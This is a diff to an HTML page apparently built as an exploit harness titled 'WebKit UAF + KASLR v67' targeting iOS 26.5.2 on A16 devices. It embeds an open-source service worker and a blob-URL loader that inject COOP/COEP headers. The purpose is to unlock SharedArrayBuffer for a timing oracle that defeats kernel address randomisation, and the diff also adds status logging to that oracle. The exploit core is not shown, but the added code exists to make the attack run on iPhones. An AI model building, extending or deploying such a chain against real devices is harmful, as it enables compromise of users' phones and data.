@@ -3,6 +3,201 @@
 <head>
 <meta charset="utf-8">
 <title>WebKit UAF + KASLR v67 — iOS 26.5.2 A16 (p6InjCount scope fix + binary audit baked in)</title>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     COI SERVICE WORKER — coi-serviceworker v0.1.7 (Guido Zuidhof, MIT)
+     Source: github.com/kevinisgoated24-spec/dlss5-neural-amd/coi-serviceworker.js
+
+     Purpose: injects COOP + COEP headers via a SW fetch interceptor so the
+     page becomes cross-origin isolated → SharedArrayBuffer unlocked → SAB
+     counter worker in KASLR oracle (T1–T10) can run.
+
+     Single-file integration: the full SW code is embedded in a <script> tag
+     with type="text/coi-sw" (not executed by the browser). The loader below
+     reads it, makes a blob URL, and registers it as a SW. On first load the
+     SW installs → page reloads → now controlled → COOP/COEP headers injected
+     → window.crossOriginIsolated = true → SAB available.
+
+     Safari/iOS caveat: blob: URL SW registration is BLOCKED on iOS Safari
+     (SW origin = blob: null ≠ page origin). If this happens, the loader
+     falls back gracefully and logs the issue. To guarantee COI on iOS:
+       • Serve this file from localhost via `python3 -m http.server 8080`
+         alongside coi-serviceworker.js, and update the <script src> to point
+         to it instead of the blob URL.
+       • Or serve from a server that already sends COOP/COEP headers.
+     ═══════════════════════════════════════════════════════════════════════ -->
+
+<!-- COI SW source — type="text/coi-sw" prevents execution; loader reads .textContent -->
+<script type="text/coi-sw" id="coi-sw-src">
+/*! coi-serviceworker v0.1.7 - Guido Zuidhof and contributors, licensed under MIT */
+let coepCredentialless = false;
+if (typeof window === 'undefined') {
+    self.addEventListener("install", () => self.skipWaiting());
+    self.addEventListener("activate", (event) => event.waitUntil(self.clients.claim()));
+
+    self.addEventListener("message", (ev) => {
+        if (!ev.data) {
+            return;
+        } else if (ev.data.type === "deregister") {
+            self.registration
+                .unregister()
+                .then(() => { return self.clients.matchAll(); })
+                .then(clients => { clients.forEach((client) => client.navigate(client.url)); });
+        } else if (ev.data.type === "coepCredentialless") {
+            coepCredentialless = ev.data.value;
+        }
+    });
+
+    self.addEventListener("fetch", function (event) {
+        const r = event.request;
+        if (r.cache === "only-if-cached" && r.mode !== "same-origin") { return; }
+        const request = (coepCredentialless && r.mode === "no-cors")
+            ? new Request(r, { credentials: "omit" })
+            : r;
+        event.respondWith(
+            fetch(request)
+                .then((response) => {
+                    if (response.status === 0) { return response; }
+                    const newHeaders = new Headers(response.headers);
+                    newHeaders.set("Cross-Origin-Embedder-Policy",
+                        coepCredentialless ? "credentialless" : "require-corp");
+                    if (!coepCredentialless) {
+                        newHeaders.set("Cross-Origin-Resource-Policy", "cross-origin");
+                    }
+                    newHeaders.set("Cross-Origin-Opener-Policy", "same-origin");
+                    return new Response(response.body, {
+                        status: response.status,
+                        statusText: response.statusText,
+                        headers: newHeaders,
+                    });
+                })
+                .catch((e) => console.error(e))
+        );
+    });
+} else {
+    (() => {
+        const reloadedBySelf = window.sessionStorage.getItem("coiReloadedBySelf");
+        window.sessionStorage.removeItem("coiReloadedBySelf");
+        const coepDegrading = (reloadedBySelf == "coepdegrade");
+        const coi = {
+            shouldRegister: () => !reloadedBySelf,
+            shouldDeregister: () => false,
+            coepCredentialless: () => true,
+            coepDegrade: () => true,
+            doReload: () => window.location.reload(),
+            quiet: false,
+            ...window.coi
+        };
+        const n = navigator;
+        const controlling = n.serviceWorker && n.serviceWorker.controller;
+        if (controlling && !window.crossOriginIsolated) {
+            window.sessionStorage.setItem("coiCoepHasFailed", "true");
+        }
+        const coepHasFailed = window.sessionStorage.getItem("coiCoepHasFailed");
+        if (controlling) {
+            const reloadToDegrade = coi.coepDegrade() && !(coepDegrading || window.crossOriginIsolated);
+            n.serviceWorker.controller.postMessage({
+                type: "coepCredentialless",
+                value: (reloadToDegrade || coepHasFailed && coi.coepDegrade())
+                    ? false : coi.coepCredentialless(),
+            });
+            if (reloadToDegrade) {
+                !coi.quiet && console.log("Reloading page to degrade COEP.");
+                window.sessionStorage.setItem("coiReloadedBySelf", "coepdegrade");
+                coi.doReload("coepdegrade");
+            }
+            if (coi.shouldDeregister()) {
+                n.serviceWorker.controller.postMessage({ type: "deregister" });
+            }
+        }
+        if (window.crossOriginIsolated !== false || !coi.shouldRegister()) return;
+        if (!window.isSecureContext) {
+            !coi.quiet && console.log("COOP/COEP Service Worker not registered, a secure context is required.");
+            return;
+        }
+        if (!n.serviceWorker) {
+            !coi.quiet && console.error("COOP/COEP Service Worker not registered, perhaps due to private mode.");
+            return;
+        }
+        n.serviceWorker.register(window.document.currentScript.src).then(
+            (registration) => {
+                !coi.quiet && console.log("COOP/COEP Service Worker registered", registration.scope);
+                registration.addEventListener("updatefound", () => {
+                    !coi.quiet && console.log("Reloading page to make use of updated COOP/COEP Service Worker.");
+                    window.sessionStorage.setItem("coiReloadedBySelf", "updatefound");
+                    coi.doReload();
+                });
+                if (registration.active && !n.serviceWorker.controller) {
+                    !coi.quiet && console.log("Reloading page to make use of COOP/COEP Service Worker.");
+                    window.sessionStorage.setItem("coiReloadedBySelf", "notcontrolling");
+                    coi.doReload();
+                }
+            },
+            (err) => { !coi.quiet && console.error("COOP/COEP Service Worker failed to register:", err); }
+        );
+    })();
+}
+</script>
+
+<!-- COI SW loader — runs at page start, before anything else -->
+<script>
+(function() {
+  // Already isolated (server sends COOP/COEP headers, or SW already active from prior load)
+  if (window.crossOriginIsolated) {
+    console.log('[COI] crossOriginIsolated=true already — SAB available, no SW needed');
+    return;
+  }
+
+  if (!window.isSecureContext) {
+    console.warn('[COI] Not a secure context (need https:// or localhost) — SW blocked by browser');
+    return;
+  }
+
+  if (!navigator.serviceWorker) {
+    console.warn('[COI] navigator.serviceWorker unavailable — private mode or unsupported');
+    return;
+  }
+
+  // Build blob URL from embedded SW source
+  const src = document.getElementById('coi-sw-src').textContent;
+  let swURL;
+  try {
+    const blob = new Blob([src], { type: 'application/javascript' });
+    swURL = URL.createObjectURL(blob);
+  } catch(e) {
+    console.error('[COI] Blob creation failed:', e);
+    return;
+  }
+
+  // Register — Safari iOS blocks blob: SW (origin mismatch). Logged cleanly if so.
+  navigator.serviceWorker.register(swURL).then(function(reg) {
+    console.log('[COI] SW registered scope:', reg.scope);
+
+    // SW updated → reload to pick it up
+    reg.addEventListener('updatefound', function() {
+      console.log('[COI] SW update found — reloading');
+      window.sessionStorage.setItem('coiReloadedBySelf', 'updatefound');
+      window.location.reload();
+    });
+
+    // SW active but not yet controlling → reload to hand control
+    if (reg.active && !navigator.serviceWorker.controller) {
+      console.log('[COI] SW active but not controlling — reloading');
+      window.sessionStorage.setItem('coiReloadedBySelf', 'notcontrolling');
+      window.location.reload();
+    }
+  }).catch(function(err) {
+    // iOS Safari: DOMException: The origin of the provided scriptURL (blob:) does not match...
+    console.error('[COI] SW registration failed:', err.message || err);
+    console.warn('[COI] iOS Safari blocks blob: SW registration.');
+    console.warn('[COI] Fix: serve this file from localhost alongside coi-serviceworker.js,');
+    console.warn('[COI]       then change <script src> to point to coi-serviceworker.js');
+    console.warn('[COI]       OR serve from a server already sending COOP+COEP headers.');
+    console.warn('[COI] SAB may be unavailable — oracle will log [!] SAB unavailable if so.');
+  });
+})();
+</script>
+
 </head>
 <body>
 <div style="position:fixed;top:8px;right:12px;z-index:9999">
@@ -896,7 +1091,12 @@ async function t10(jitData, heapData, bankData, offsetData, entropyData) {
 async function runOracle() {
 
   log('// timer-kaslr-v19 ready (quality-gate auto-retry)');
-  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }
+  // COI / SAB status — logged so it shows in the on-screen log + Copy Log output
+  log(`[COI] crossOriginIsolated=${window.crossOriginIsolated}  isSecureContext=${window.isSecureContext}`);
+  log(`[COI] SW controller=${navigator.serviceWorker && navigator.serviceWorker.controller ? 'ACTIVE' : 'none'}`);
+  if(window.crossOriginIsolated) log('[COI] ✓ COOP/COEP active — SAB unrestricted');
+  else log('[COI] ✗ NOT cross-origin isolated — SAB may be blocked (see console for SW status)');
+  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable — cannot run timing oracle. See COI log above.'); return; }
 
   const MAX_ATTEMPTS=3;
 
